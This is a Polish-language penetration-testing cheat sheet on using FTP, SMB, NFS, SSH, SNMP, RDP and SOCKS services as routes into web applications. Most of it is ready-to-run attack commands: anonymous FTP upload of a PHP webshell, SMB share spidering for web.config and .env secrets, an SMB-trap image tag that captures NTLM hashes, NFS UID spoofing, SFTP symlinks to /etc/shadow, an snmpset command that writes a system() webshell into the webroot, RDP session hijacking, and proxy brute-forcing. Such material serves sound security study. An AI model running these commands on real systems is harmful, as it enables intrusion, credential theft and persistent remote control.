# FTP, SMB, NFS, SSH, SNMP, RDP, SOCKS -- wektory ataku na aplikacje webowe

## Wstep

Uslugi sieciowe takie jak FTP, SMB, NFS, SSH czy SNMP moga miec bezposredni wplyw
na bezpieczenstwo aplikacji webowych -- od uploadu webshelli, przez ujawnienie kodu
zrodlowego, po tunelowanie do wewnetrznych serwisow webowych.

---

## 1. FTP -- upload webshelli

### 1.1 FTP root zmapowany na webroot (XAMPP/ProFTPD)

Czeste konfiguracje XAMPP/ProFTPD mapuja katalog FTP na `/opt/lampp/htdocs`.
Slabe poswiadczenia kont serwisowych (np. `daemon`, `nobody`) pozwalaja
na **bezposredni upload webshella PHP do katalogu serwowanego przez serwer HTTP**.

```bash
# Logowanie anonimowe
ftp <IP>
> anonymous
> anonymous
> put webshell.php
> bye

# Sprawdzenie webroota
curl http://<IP>/webshell.php?cmd=id
```

### 1.2 FTP Bounce Attack -- skanowanie portow wewnetrznych

Jesli serwer FTP obsluguje komende PORT, mozna go uzyc jako proxy
do skanowania portow wewnetrznych hostow (np. serwerow webowych za firewallem):

```bash
nmap -Pn -v -p 80,443,8080,8443 -b ftp:ftp@<FTP_IP> <WEWNETRZNY_HOST>
```

### 1.3 FTP jako wektor SSRF

Jesli aplikacja webowa przesyla dane kontrolowane przez uzytkownika
bezposrednio do serwera FTP, mozna wyslac podwojnie zakodowane znaki
`%250d%250a` aby wstrzyknac komendy FTP -- a nawet wyslac zapytanie HTTP
do wewnetrznego serwera.

### 1.4 Niebezpieczne ustawienia vsFTPd

```
anonymous_enable=YES        # Anonimowy dostep
anon_upload_enable=YES      # Upload bez uwierzytelnienia
write_enable=YES            # Zapis plikow
```

---

## 2. SMB -- ujawnienie kodu zrodlowego i konfiguracji

### 2.1 Udzialy zawierajace pliki aplikacji webowych

Zle skonfigurowane udzialy SMB moga ujawniac:
- **Kod zrodlowy aplikacji** (pliki .php, .aspx, .py, .config)
- **Pliki konfiguracyjne** (`web.config`, `appsettings.json`, `.env`)
- **Bazy danych** (SQLite, pliki backupow)
- **Skrypty logowania** w SYSVOL (mogace zawierac hasla)

```bash
# Enumeracja udzialow (null session)
smbclient --no-pass -L //<IP>
smbmap -H <IP>
crackmapexec smb <IP> -u '' -p '' --shares

# Rekursywne przeszukiwanie udzialow
smbmap -u "username" -p "password" -R -H <IP>

# Wyszukiwanie interesujacych plikow
crackmapexec smb <IP> -u user -p pass -M spider_plus --pattern "web.config|.env|appsettings"
```

### 2.2 Plik `web.config` i `Registry.xml`

Pliki `Registry.xml` na udzialach moga zawierac hasla uzytkownikow
skonfigurowanych z autologon przez Group Policy.
Pliki `web.config` czesto zawieraja connection stringi do baz danych.

### 2.3 SMB-Trap -- wymuszenie uwierzytelnienia z aplikacji webowej

Biblioteka Windows URLMon.dll automatycznie uwierzytelnia sie do hosta
gdy strona probuje uzyskac dostep do zasobu przez SMB:

```html
<!-- Na stronie kontrolowanej przez atakujacego -->
<img src="\\10.10.10.10\share\image.jpg">
```

Pozwala to na przechwycenie hashy NetNTLMv2 za pomoca narzedzia Responder.

### 2.4 NTLM Relay przez SMB

Przechwycone sesje uwierzytelniania SMB moga byc relay'owane
do innych uslug (np. serwerow webowych z uwierzytelnianiem NTLM).

---

## 3. NFS -- dostep do plikow aplikacji webowej

### 3.1 Ujawnienie kodu zrodlowego i konfiguracji

Zle skonfigurowane eksporty NFS moga ujawniac katalogi webowe:

```bash
# Enumeracja eksportow
showmount -e <IP>

# Montowanie
mount -t nfs [-o vers=2] <IP>:/srv /mnt/nfs -o nolock

# Jesli eksport to /srv a /var/www jest w tym samym systemie plikow:
# Mozliwe ucieczka z eksportu (jesli subtree_check wylaczony - domyslnie na Linuxie)
```

### 3.2 Ucieczka z eksportow (subtree_check disabled)

Jesli serwer NFS eksportuje `/srv/`, a `/var/www/` jest w tym samym systemie plikow,
mozliwe jest odczytanie plikow webowych lub **upload webshella do `/var/www/`**.

### 3.3 no_root_squash -- eskalacja uprawnien

Jesli `no_root_squash` jest wlaczone, atakujacy moze tworzyc pliki
z UID 0 (root) -- w tym pliki SUID lub webshelle z odpowiednimi uprawnieniami.

### 3.4 Podszywanie sie pod UID

Domyslnie NFS ufa UID/GID klienta. Jesli pliki webowe sa wlasnoscia
konkretnego uzytkownika, wystarczy utworzyc lokalnie uzytkownika z tym samym UID:

```bash
# Sprawdzenie wlasciciela plikow
ls -lan /mnt/nfs/
# Utworzenie lokalnego uzytkownika z pasujacym UID
useradd -u 1001 fakeuser
su fakeuser
cat /mnt/nfs/config/database.yml
```

---

## 4. SSH -- tunelowanie do wewnetrznych serwisow webowych

### 4.1 Port forwarding (local)

Po uzyskaniu dostepu SSH do serwera, mozna tunelowac ruch
do wewnetrznych aplikacji webowych niedostepnych z zewnatrz:

```bash
# Dostep do wewnetrznego serwisu webowego na porcie 8080
ssh -L 8080:<wewnetrzny_host>:8080 -N -f user@<serwer>

# Teraz w przegladarce: http://localhost:8080
```

### 4.2 Dynamic SOCKS proxy

```bash
# Utworzenie SOCKS proxy przez SSH
ssh -D 1080 -N -f user@<serwer>

# Konfiguracja przegladarki/burpa na SOCKS5 localhost:1080
# Dostep do wszystkich wewnetrznych serwisow webowych
```

### 4.3 SFTP Symlink -- odczyt plikow przez serwer webowy

Jesli SFTP i serwer WWW wspoldziela system plikow, atakujacy z dostepem SFTP
moze tworzyc dowiazania symboliczne do krytycznych plikow:

```bash
sftp> symlink / froot
sftp> symlink /etc/shadow shadow_link
# Jesli dowiazanie jest dostepne przez web: http://<IP>/froot/etc/passwd
```

### 4.4 Kluczowe podatnosci SSH (kontekst webowy)

- **CVE-2024-6387 (regreSSHion):** Pre-auth RCE w OpenSSH 8.5p1-9.7p1
  -- moze dac root na serwerze hostujacym aplikacje webowa
- **CVE-2024-3094 (xz backdoor):** Backdoor w liblzma hookujacy `RSA_public_decrypt`
  w sshd -- pre-auth code execution na dotknietkych systemach
- **CVE-2025-32433 (Erlang/OTP):** Bypass state machine -- pre-auth RCE
  na urzadzeniach z Erlang SSH (IoT, OT, management portals)

---

## 5. SNMP -- ujawnienie informacji o infrastrukturze webowej

### 5.1 Enumeracja infrastruktury

SNMP pozwala na odkrycie serwerow webowych, ich konfiguracji i procesow:

```bash
# Enumeracja (wymaga znajomosci community string)
snmpwalk -v2c -c public <IP> .1

# Kluczowe OID-y:
# 1.3.6.1.2.1.25.4.2.1.2  -- dzialajace procesy (apache, nginx, tomcat?)
# 1.3.6.1.2.1.25.4.2.1.4  -- sciezki procesow (/var/www, /opt/app)
# 1.3.6.1.2.1.25.6.3.1.2  -- zainstalowane oprogramowanie
# 1.3.6.1.2.1.6.13.1.3    -- otwarte porty TCP (80, 443, 8080?)
# 1.3.6.1.4.1.77.1.2.25   -- konta uzytkownikow
```

### 5.2 Co mozna odkryc przydatnego dla pentestera webowego

- **Wersje serwerow HTTP** (Apache 2.4.x, nginx 1.x, IIS y.y)
- **Sciezki aplikacji** na dysku
- **Otwarte porty** wskazujace na ukryte serwisy webowe
- **Konta uzytkownikow** do password sprayingu
- **Adresy email** do phishingu
- **Prywatny community string** -> mozliwosc SNMP RCE

### 5.3 SNMP RCE -- od SNMP do webshella

Jesli posiadamy community string z uprawnieniami zapisu (rw), mozemy
wykonywac komendy na serwerze -- w tym tworzyc webshelle:

```bash
# Wstrzykniecie komendy tworzacej webshella
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <RW_COMMUNITY> <IP> \
  'nsExtendStatus."webshell"' = createAndGo \
  'nsExtendCommand."webshell"' = /bin/bash \
  'nsExtendArgs."webshell"' = '-c "echo \"<?php system(\$_GET[cmd]); ?>\" > /var/www/html/cmd.php"'

# Odczyt wyzwala wykonanie
snmpwalk -v2c -c <RW_COMMUNITY> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

### 5.4 Wyszukiwanie wrażliwych danych w zrzutach SNMP

```bash
# Emaile
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" *.snmp

# Hasla / nieudane logowania
grep -i "login\|fail" *.snmp

# Prywatne community strings
grep -i "trap" *.snmp
```

---

## 6. RDP -- dostep do interfejsu aplikacji webowych

### 6.1 Tunelowanie przez RDP

RDP obsluguje kanaly wirtualne, ktore moga byc wykorzystane do pivotingu:

```bash
# Tunelowanie TCP przez RDP z rdp2tcp
xfreerdp /u:<user> /v:<IP> /rdp2tcp:/path/to/rdp2tcp/client/rdp2tcp
```

### 6.2 Przejmowanie sesji

Z uprawnieniami SYSTEM mozna przejac otwarta sesje RDP innego uzytkownika
(np. administratora aplikacji webowej) bez znajomosci hasla:

```bash
query user
tscon <ID> /dest:<SESSIONNAME>
```

---

## 7. SOCKS proxy -- dostep do wewnetrznych serwisow webowych

### 7.1 Wykorzystanie otwartego proxy SOCKS

Znaleziony otwarty proxy SOCKS pozwala uzyskac dostep do wewnetrznych
aplikacji webowych:

```bash
# Walidacja dostepu do wewnetrznej sieci
curl --socks5-hostname <IP>:1080 http://internal.webapp:8080

# Skanowanie wewnetrznych hostow webowych
proxychains4 -q nmap -sT -Pn --top-ports 200 <wewnetrzny_host>

# Konfiguracja Burp Suite:
# Project Options -> SOCKS Proxy -> <IP>:1080
# Uzyc socks5h:// aby DNS tez szedl przez proxy
```

### 7.2 Brute-force SOCKS proxy

```bash
nmap --script socks-brute -p 1080 <IP>
hydra -L users.txt -P passwords.txt -s 1080 <IP> socks5
```

---

## 8. Podsumowanie -- mapa wektorow

| Usluga | Wektor ataku webowego | Priorytet |
|--------|----------------------|-----------|
| FTP -> webroot | Upload webshella PHP | Krytyczny |
| FTP bounce | Skanowanie portow wewnetrznych | Sredni |
| SMB shares | Ujawnienie web.config, kodu zrodlowego | Krytyczny |
| SMB-Trap | Kradziez hashy NTLM z przegladarki | Wysoki |
| NFS export | Odczyt/zapis plikow webowych | Krytyczny |
| NFS escape | Dostep do /var/www z eksportu /srv | Wysoki |
| SSH tunnel | Dostep do wewnetrznych serwisow webowych | Wysoki |
| SFTP symlink | Odczyt plikow systemowych przez web | Wysoki |
| SNMP enum | Odkrycie serwerow, portow, kont | Sredni |
| SNMP RCE | Tworzenie webshella na serwerze | Krytyczny |
| RDP tunnel | Pivoting do wewnetrznych webappow | Sredni |
| SOCKS proxy | Dostep do calej wewnetrznej sieci | Wysoki |
